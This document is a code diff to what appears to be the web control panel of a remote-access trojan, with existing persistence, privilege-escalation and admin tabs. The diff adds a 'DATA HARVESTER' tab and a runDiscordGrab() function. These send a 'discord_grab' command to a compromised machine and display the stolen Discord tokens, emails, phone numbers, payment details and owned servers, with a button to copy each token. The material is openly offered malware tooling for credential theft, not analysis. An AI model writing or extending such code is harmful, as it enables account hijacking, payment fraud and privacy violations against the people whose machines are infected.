@@ -290,6 +290,7 @@ select{background:#050810;border:1px solid var(--border);padding:4px 8px;color:v
       <button class="tab-btn" data-tab="persist">PERSIST</button>
       <button class="tab-btn" data-tab="privesc" style="color:var(--warn);">⚡ PRIVESC</button>
       <button class="tab-btn" data-tab="admin" style="color:var(--danger);">👑 ADMIN</button>
+      <button class="tab-btn" data-tab="data" style="color:var(--purple);">💀 DATA</button>
     </div>
     <div class="modal-body">
 
@@ -599,6 +600,28 @@ select{background:#050810;border:1px solid var(--border);padding:4px 8px;color:v
           </div>
           <div style="margin:14px 0 8px;font-size:9px;letter-spacing:3px;color:var(--dim);text-transform:uppercase;border-bottom:1px solid var(--border);padding-bottom:4px;">Result Log</div>
           <div id="admin-result" style="font-size:12px;color:var(--dim);background:#050810;border:1px solid var(--border);padding:10px 14px;min-height:60px;max-height:160px;overflow-y:auto;white-space:pre-wrap;line-height:1.8;"></div>
+        </div>
+      </div>
+
+      <!-- DATA -->
+      <div class="tab-content" id="tab-data">
+        <div style="flex:1;min-height:0;overflow-y:auto;padding:20px 24px;">
+
+          <div style="margin-bottom:18px;padding:14px;background:rgba(179,136,255,0.06);border:1px solid rgba(179,136,255,0.2);">
+            <div style="font-size:10px;color:var(--purple);letter-spacing:2px;margin-bottom:6px;">💀 DATA HARVESTER</div>
+            <div style="font-size:11px;color:var(--dim);line-height:1.8;">Extracts Discord tokens, account info, guilds, Nitro status, and payment methods from all browsers and Discord clients on the target. Results return directly to this panel.</div>
+          </div>
+
+          <div style="display:flex;gap:10px;margin-bottom:20px;flex-wrap:wrap;align-items:center;">
+            <button class="btn btn-purple" onclick="runDiscordGrab()">💀 GRAB DISCORD TOKENS</button>
+            <button class="btn btn-warn btn-sm" onclick="clearDiscordResults()">CLR</button>
+            <span id="discord-grab-status" style="font-size:10px;color:var(--dim);"></span>
+          </div>
+
+          <div id="discord-results">
+            <div style="font-size:11px;color:var(--dim);">No results yet — click GRAB to harvest tokens.</div>
+          </div>
+
         </div>
       </div>
 
@@ -1383,6 +1406,66 @@ function addLog(msg,type='info'){
   log.appendChild(line); log.scrollTop=log.scrollHeight;
   while(log.children.length>80) log.removeChild(log.firstChild);
 }
+
+// ── Discord Grab ──
+async function runDiscordGrab(){
+  if(!selectedClient) return;
+  const status = document.getElementById('discord-grab-status');
+  const results = document.getElementById('discord-results');
+  status.textContent = '● RUNNING...';
+  status.style.color = 'var(--accent)';
+  results.innerHTML = '<div style="font-size:11px;color:var(--dim);animation:pulse 1.5s infinite;">Harvesting tokens...</div>';
+  const res = await sendCmdRaw('discord_grab');
+  status.textContent = res.status === 'ok' ? 'DONE' : 'ERROR';
+  status.style.color = res.status === 'ok' ? 'var(--accent)' : 'var(--danger)';
+  if(res.status !== 'ok'){
+    results.innerHTML = `<div style="color:var(--danger);font-size:12px;">Error: ${esc(res.msg)}</div>`;
+    return;
+  }
+  const accounts = res.data || [];
+  if(!accounts.length){
+    results.innerHTML = '<div style="font-size:11px;color:var(--dim);">No tokens found on this machine.</div>';
+    return;
+  }
+  results.innerHTML = accounts.map(a => {
+    const badges = [];
+    if(a.nitro) badges.push('<span class="tag" style="color:#b388ff;border-color:rgba(179,136,255,0.4);background:rgba(179,136,255,0.08);">NITRO</span>');
+    if(a.has_payment) badges.push('<span class="tag" style="color:var(--accent);border-color:rgba(0,255,136,0.4);background:rgba(0,255,136,0.08);">💳 PAYMENT</span>');
+    if(a.mfa) badges.push('<span class="tag tag-blue">2FA</span>');
+    return `<div style="background:var(--panel2);border:1px solid var(--border);padding:14px 16px;margin-bottom:10px;">
+      <div style="display:flex;align-items:center;gap:10px;margin-bottom:10px;">
+        ${a.avatar ? `<img src="${esc(a.avatar)}" style="width:38px;height:38px;border-radius:50%;border:1px solid var(--border);">` : '<div style="width:38px;height:38px;border-radius:50%;background:var(--border);"></div>'}
+        <div style="flex:1;">
+          <div style="color:var(--accent2);font-size:13px;font-weight:bold;">${esc(a.username)}</div>
+          <div style="color:var(--dim);font-size:10px;">${esc(a.id)} · ${esc(a.platform)}</div>
+        </div>
+        <div style="display:flex;gap:5px;flex-wrap:wrap;">${badges.join('')}</div>
+      </div>
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;font-size:11px;margin-bottom:10px;">
+        <div><span style="color:var(--dim);">Email: </span><span style="color:var(--text);">${esc(a.email||'—')}</span></div>
+        <div><span style="color:var(--dim);">Phone: </span><span style="color:var(--text);">${esc(a.phone||'—')}</span></div>
+        <div><span style="color:var(--dim);">Locale: </span><span style="color:var(--text);">${esc(a.locale||'—')}</span></div>
+        <div><span style="color:var(--dim);">Guilds: </span><span style="color:var(--accent);">${a.guild_count||0}</span></div>
+        ${a.nitro_expiry ? `<div style="grid-column:span 2"><span style="color:var(--dim);">Nitro until: </span><span style="color:var(--purple);">${esc(a.nitro_expiry)}</span></div>` : ''}
+        ${a.payment_info ? `<div style="grid-column:span 2"><span style="color:var(--dim);">Payment: </span><span style="color:var(--accent);">${esc(a.payment_info)}</span></div>` : ''}
+        ${a.boosts ? `<div style="grid-column:span 2"><span style="color:var(--dim);">Boosts: </span><span style="color:var(--purple);">${esc(a.boosts)}</span></div>` : ''}
+      </div>
+      <div style="background:#050810;border:1px solid var(--border);padding:8px 10px;font-size:10px;color:var(--warn);word-break:break-all;margin-bottom:8px;">${esc(a.token)}</div>
+      <button class="btn btn-blue btn-sm" onclick="navigator.clipboard.writeText('${esc2(a.token)}')">COPY TOKEN</button>
+      ${a.admin_guilds && a.admin_guilds.length ? `
+      <div style="margin-top:10px;">
+        <div style="font-size:9px;letter-spacing:2px;color:var(--dim);margin-bottom:5px;text-transform:uppercase;">Admin/Owner Guilds</div>
+        ${a.admin_guilds.map(g=>`<div style="font-size:10px;color:var(--text);padding:3px 0;border-bottom:1px solid rgba(26,35,50,0.4);">${esc(g.name)} <span style="color:var(--dim);">(${g.members} members${g.vanity?` · .gg/${g.vanity}`:''})</span></div>`).join('')}
+      </div>` : ''}
+    </div>`;
+  }).join('');
+}
+
+function clearDiscordResults(){
+  document.getElementById('discord-results').innerHTML = '<div style="font-size:11px;color:var(--dim);">No results yet — click GRAB to harvest tokens.</div>';
+  document.getElementById('discord-grab-status').textContent = '';
+}
+
 
 // ── Utils ──
 function esc(s){ return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
